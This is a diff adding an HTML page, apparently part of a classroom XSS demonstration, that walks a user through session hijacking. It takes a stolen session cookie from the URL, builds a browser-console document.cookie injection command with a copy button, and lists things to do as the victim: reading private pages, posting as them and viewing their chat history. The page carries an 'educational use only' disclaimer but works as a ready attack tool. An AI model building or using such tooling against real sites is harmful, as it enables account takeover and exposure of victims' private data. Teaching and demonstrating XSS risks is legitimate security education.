@@ -1,0 +1,323 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>🎯 Session Hijacking Instructions</title>
+  <style>
+    body { 
+      background: linear-gradient(135deg, #000 0%, #1a1a1a 100%);
+      color: #00ff00; 
+      font-family: 'Courier New', monospace; 
+      padding: 20px;
+      margin: 0;
+    }
+    .container {
+      max-width: 900px;
+      margin: 0 auto;
+      background: #0a0a0a;
+      padding: 30px;
+      border: 3px solid #00ff00;
+      border-radius: 15px;
+      box-shadow: 0 0 30px rgba(0, 255, 0, 0.3);
+    }
+    h1 { 
+      color: #ff0000;
+      text-align: center;
+      font-size: 2.5rem;
+      margin-bottom: 10px;
+      text-shadow: 0 0 10px #ff0000;
+    }
+    .subtitle {
+      text-align: center;
+      color: #ffaa00;
+      margin-bottom: 30px;
+      font-size: 1.1rem;
+    }
+    .step { 
+      background: #000; 
+      padding: 25px; 
+      margin: 20px 0; 
+      border-left: 6px solid #ff0000;
+      border-radius: 8px;
+      transition: all 0.3s;
+    }
+    .step:hover {
+      border-left-width: 10px;
+      box-shadow: 0 0 20px rgba(255, 0, 0, 0.3);
+    }
+    .step-number {
+      color: #ff0000;
+      font-size: 1.8rem;
+      font-weight: bold;
+      margin-bottom: 15px;
+      display: block;
+    }
+    .step-content {
+      color: #ffffff;
+      line-height: 1.8;
+    }
+    pre { 
+      background: #000; 
+      padding: 20px; 
+      border-radius: 8px;
+      overflow-x: auto; 
+      color: #ffaa00;
+      border: 2px solid #ffaa00;
+      margin: 15px 0;
+      font-size: 0.95rem;
+      position: relative;
+    }
+    button {
+      background: #00ff00;
+      color: #000;
+      border: none;
+      padding: 12px 25px;
+      font-size: 1rem;
+      border-radius: 8px;
+      cursor: pointer;
+      margin: 10px 5px;
+      font-family: 'Courier New', monospace;
+      font-weight: bold;
+      transition: all 0.3s;
+      box-shadow: 0 4px 15px rgba(0, 255, 0, 0.3);
+    }
+    button:hover { 
+      background: #00cc00;
+      transform: translateY(-2px);
+      box-shadow: 0 6px 20px rgba(0, 255, 0, 0.5);
+    }
+    button:active {
+      transform: translateY(0);
+    }
+    button.red {
+      background: #ff0000;
+      color: #fff;
+      box-shadow: 0 4px 15px rgba(255, 0, 0, 0.3);
+    }
+    button.red:hover { 
+      background: #cc0000;
+      box-shadow: 0 6px 20px rgba(255, 0, 0, 0.5);
+    }
+    a { 
+      color: #00ff00;
+      text-decoration: none;
+      font-size: 1.2rem;
+      font-weight: bold;
+      padding: 10px 15px;
+      background: rgba(0, 255, 0, 0.1);
+      border-radius: 5px;
+      display: inline-block;
+      margin: 10px 0;
+      transition: all 0.3s;
+    }
+    a:hover { 
+      color: #00cc00;
+      background: rgba(0, 255, 0, 0.2);
+      transform: translateX(5px);
+    }
+    kbd {
+      background: #333;
+      border: 2px solid #666;
+      padding: 5px 12px;
+      border-radius: 5px;
+      font-family: 'Courier New', monospace;
+      color: #fff;
+      font-weight: bold;
+      box-shadow: 0 2px 5px rgba(0, 0, 0, 0.5);
+    }
+    .success { 
+      color: #00ff00;
+      font-weight: bold;
+      font-size: 1.3rem;
+      text-shadow: 0 0 10px #00ff00;
+    }
+    .warning { 
+      color: #ffaa00;
+      background: rgba(255, 170, 0, 0.1);
+      padding: 10px;
+      border-radius: 5px;
+      border-left: 4px solid #ffaa00;
+    }
+    .info-box {
+      background: rgba(0, 255, 0, 0.05);
+      border: 2px solid #00ff00;
+      padding: 20px;
+      border-radius: 10px;
+      margin: 20px 0;
+    }
+    .footer {
+      text-align: center;
+      margin-top: 40px;
+      padding-top: 20px;
+      border-top: 2px solid #00ff00;
+    }
+    ul {
+      line-height: 2;
+    }
+    ul li {
+      margin: 10px 0;
+    }
+    .highlight {
+      color: #ffaa00;
+      font-weight: bold;
+    }
+    code {
+      background: #1a1a1a;
+      padding: 2px 6px;
+      border-radius: 3px;
+      color: #ffaa00;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h1>🎯 SESSION HIJACKING GUIDE</h1>
+    <div class="subtitle">Step-by-Step Instructions for Educational Demonstration</div>
+    
+    <div class="info-box">
+      <strong style="color: #ff0000;">📋 OVERVIEW:</strong>
+      <p style="color: #ffffff; margin: 10px 0;">
+        You have successfully stolen a victim's session cookie through XSS.
+        Now you'll inject this cookie into your browser to impersonate the victim
+        without knowing their password. This demonstrates the severity of XSS vulnerabilities.
+      </p>
+    </div>
+    
+    <!-- STEP 1 -->
+    <div class="step">
+      <span class="step-number">STEP 1: Open Target Website</span>
+      <div class="step-content">
+        <p>Click the link below to open the target website in a <strong>new tab</strong>:</p>
+        <a href="#" id="targetLink" target="_blank">
+          🔗 <span id="targetDisplay">Target Site</span>
+        </a>
+        <p class="warning" style="margin-top: 15px;">
+          <strong>💡 Pro Tip:</strong> Open this link in an <strong>incognito/private window</strong> 
+          to avoid interfering with your legitimate session.
+        </p>
+      </div>
+    </div>
+    
+    <!-- STEP 2 -->
+    <div class="step">
+      <span class="step-number">STEP 2: Open Developer Console</span>
+      <div class="step-content">
+        <p>On the target website page, open the browser's Developer Tools:</p>
+        <ul>
+          <li>Press <kbd>F12</kbd> on your keyboard</li>
+          <li><strong>OR</strong> Press <kbd>Ctrl</kbd> + <kbd>Shift</kbd> + <kbd>I</kbd> (Windows/Linux)</li>
+          <li><strong>OR</strong> Press <kbd>Cmd</kbd> + <kbd>Option</kbd> + <kbd>I</kbd> (Mac)</li>
+          <li><strong>OR</strong> Right-click anywhere → Select "Inspect"</li>
+        </ul>
+        <p style="margin-top: 15px;">Then click on the <span class="highlight">"Console"</span> tab at the top of the Developer Tools panel.</p>
+      </div>
+    </div>
+    
+    <!-- STEP 3 -->
+    <div class="step">
+      <span class="step-number">STEP 3: Inject Stolen Cookie</span>
+      <div class="step-content">
+        <p>Copy the command below by clicking the button:</p>
+        <pre id="cookieCommand">Loading cookie command...</pre>
+        <button onclick="copyCookieCmd()">📋 COPY COOKIE INJECTION COMMAND</button>
+        
+        <p style="margin-top: 20px;"><strong>What this command does:</strong></p>
+        <ul>
+          <li><code>document.cookie = "..."</code> - Sets the stolen session cookie in your browser</li>
+          <li><code>path=/</code> - Makes the cookie valid for the entire website</li>
+          <li><code>location.reload()</code> - Refreshes the page to apply the hijacked session</li>
+        </ul>
+        
+        <p style="margin-top: 15px;"><strong>Then:</strong></p>
+        <ol>
+          <li>Click in the Console input area (you'll see a <code>&gt;</code> prompt)</li>
+          <li>Press <kbd>Ctrl</kbd> + <kbd>V</kbd> (or <kbd>Cmd</kbd> + <kbd>V</kbd> on Mac) to paste</li>
+          <li>Press <kbd>Enter</kbd> to execute the command</li>
+        </ol>
+      </div>
+    </div>
+    
+    <!-- STEP 4 -->
+    <div class="step">
+      <span class="step-number">STEP 4: Verify Success ✅</span>
+      <div class="step-content">
+        <p class="success">🎉 The page will reload and you'll be logged in as the victim!</p>
+        
+        <p style="margin-top: 20px;"><strong>How to verify the hijack worked:</strong></p>
+        <ul>
+          <li>✅ Check if you can access private/authenticated pages</li>
+          <li>✅ Look for the victim's username displayed on the page</li>
+          <li>✅ Try posting comments (they'll appear as the victim)</li>
+          <li>✅ Access the victim's chat history or private data</li>
+        </ul>
+        
+        <p class="warning" style="margin-top: 20px;">
+          <strong>⚠️ Important:</strong> You are now impersonating the victim. Any actions you take 
+          will appear to come from their account. This demonstrates why XSS vulnerabilities are 
+          considered critical security issues.
+        </p>
+      </div>
+    </div>
+    
+    <!-- Technical Details -->
+    <div class="info-box" style="margin-top: 40px;">
+      <h3 style="color: #00ff00; margin-top: 0;">🔬 TECHNICAL DETAILS</h3>
+      <p><strong style="color: #ffaa00;">Target Server:</strong></p>
+      <pre style="border-color: #00ff00;" id="targetURLDisplay">Loading...</pre>
+      
+      <p><strong style="color: #ffaa00;">Stolen Session Cookie:</strong></p>
+      <pre style="font-size: 0.85rem; word-break: break-all;" id="cookieDisplay">Loading...</pre>
+      
+      <p style="margin-top: 20px;"><strong style="color: #ffaa00;">Why This Works:</strong></p>
+      <ul style="color: #ffffff;">
+        <li>The server uses cookies to identify logged-in users</li>
+        <li>XSS allowed us to steal the victim's session cookie</li>
+        <li>By setting this cookie in our browser, the server thinks we're the victim</li>
+        <li>No password needed - the session cookie IS the authentication</li>
+      </ul>
+    </div>
+    
+    <div class="footer">
+      <button class="red" onclick="window.close()">❌ CLOSE THIS WINDOW</button>
+      <p style="color: #ffaa00; margin-top: 20px;">
+        <strong>⚠️ EDUCATIONAL USE ONLY</strong><br>
+        <small style="color: #ffffff;">
+          This demonstration is for cybersecurity education. Never use these techniques 
+          without explicit authorization.
+        </small>
+      </p>
+    </div>
+  </div>
+  
+  <script>
+    // Get parameters from URL
+    const urlParams = new URLSearchParams(window.location.search);
+    const sessionCookie = urlParams.get('cookie') || 'connect.sid=COOKIE_NOT_FOUND';
+    const targetURL = urlParams.get('target') || 'https://project-1-16.eduhk.hk';
+    
+    // Update the page with dynamic content
+    document.getElementById('targetLink').href = targetURL + '/comments.html';
+    document.getElementById('targetDisplay').textContent = targetURL + '/comments.html';
+    document.getElementById('targetURLDisplay').textContent = targetURL;
+    document.getElementById('cookieDisplay').textContent = sessionCookie;
+    document.getElementById('cookieCommand').textContent = 
+      'document.cookie = "' + sessionCookie + '; path=/"; location.reload();';
+    
+    function copyCookieCmd() {
+      const cmd = document.getElementById('cookieCommand').textContent;
+      navigator.clipboard.writeText(cmd).then(() => {
+        alert('✅ Cookie injection command copied!\n\nNext steps:\n1. Go to the target site tab\n2. Make sure Console is open (F12)\n3. Paste the command and press Enter\n4. Page will reload with hijacked session!');
+      }).catch(err => {
+        alert('❌ Failed to copy automatically.\n\nPlease manually select and copy the command from the box above.');
+      });
+    }
+    
+    // Auto-focus hint
+    window.onload = function() {
+      console.log('%c🎯 SESSION HIJACKING INSTRUCTIONS READY', 'background: #00ff00; color: #000; font-size: 16px; font-weight: bold; padding: 10px;');
+      console.log('Follow the steps above to complete the session hijack demonstration.');
+    };
+  </script>
+</body>
+</html>
